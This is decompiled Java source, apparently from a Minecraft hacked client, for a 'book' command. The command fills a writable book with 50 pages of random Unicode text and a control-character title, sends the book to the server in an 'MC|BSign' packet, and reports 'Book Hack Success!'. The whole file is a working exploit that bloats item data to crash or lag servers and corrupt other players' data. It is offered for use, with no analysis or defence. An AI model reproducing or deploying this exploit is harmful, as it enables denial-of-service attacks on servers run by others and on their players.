

/*
 * Decompiled with CFR 0.150.
 *
 * Could not load the following classes:
 *  io.netty.buffer.Unpooled
 *  net.minecraft.init.Items
 *  net.minecraft.item.ItemStack
 *  net.minecraft.nbt.NBTBase
 *  net.minecraft.nbt.NBTTagList
 *  net.minecraft.nbt.NBTTagString
 *  net.minecraft.network.Packet
 *  net.minecraft.network.PacketBuffer
 *  net.minecraft.network.play.client.CPacketCustomPayload
 */
package me.snow.aclient.core.setting.superblaubeere27obfuscator;

import io.netty.buffer.Unpooled;

import java.util.Random;
import java.util.stream.Collectors;
import java.util.stream.IntStream;

import me.snow.aclient.core.setting.superblaubeere27obfuscator.AliceMain;
import me.snow.aclient.core.setting.superblaubeere27obfuscator.Command;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.Packet;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.CPacketCustomPayload;

public class BookCommand
        extends Command {
    static final boolean Field1097 = !BookCommand.class.desiredAssertionStatus();

    public BookCommand() {
        super("book", new String[0]);
    }

    private static String Method2159604(int n2) {
        return String.valueOf((char) n2);
    }

    private static int Method2159605(int n2) {
        return n2 < 55296 ? n2 : n2 + 2048;
    }

    @Override
    public void Method2159602(String[] arrstring) {
        ItemStack itemStack = BookCommand.Field2811.player.getHeldItemMainhand();
        if (itemStack.getItem() == Items.WRITABLE_BOOK) {
            Random random = new Random();
            IntStream intStream = random.ints(128, 1112063).map(BookCommand::Method2159605);
            String string = intStream.limit(10500L).mapToObj(BookCommand::Method2159604).collect(Collectors.joining());
            NBTTagList nBTTagList = new NBTTagList();
            for (int j = 0; j < 50; ++j) {
                nBTTagList.appendTag((NBTBase) new NBTTagString(string.substring(j * 210, (j + 1) * 210)));
            }
            if (itemStack.hasTagCompound()) {
                if (!Field1097 && itemStack.getTagCompound() == null) {
                    throw new AssertionError();
                }
                itemStack.getTagCompound().setTag("pages", (NBTBase) nBTTagList);
            } else {
                itemStack.setTagInfo("pages", (NBTBase) nBTTagList);
            }
            StringBuilder stringBuilder = new StringBuilder();
            for (int j = 0; j < 16; ++j) {
                stringBuilder.append("\u0014\f");
            }
            itemStack.setTagInfo("author", (NBTBase) new NBTTagString(BookCommand.Field2811.player.getName()));
            itemStack.setTagInfo("title", (NBTBase) new NBTTagString(stringBuilder.toString()));
            PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
            packetBuffer.writeItemStack(itemStack);
            BookCommand.Field2811.player.connection.sendPacket((Packet) new CPacketCustomPayload("MC|BSign", packetBuffer));
            BookCommand.Method2159696(AliceMain.Field761.Method2150114() + "Book Hack Success!");
        } else {
            BookCommand.Method2159696(AliceMain.Field761.Method2150114() + "b1g 3rr0r!");
        }
    }
}

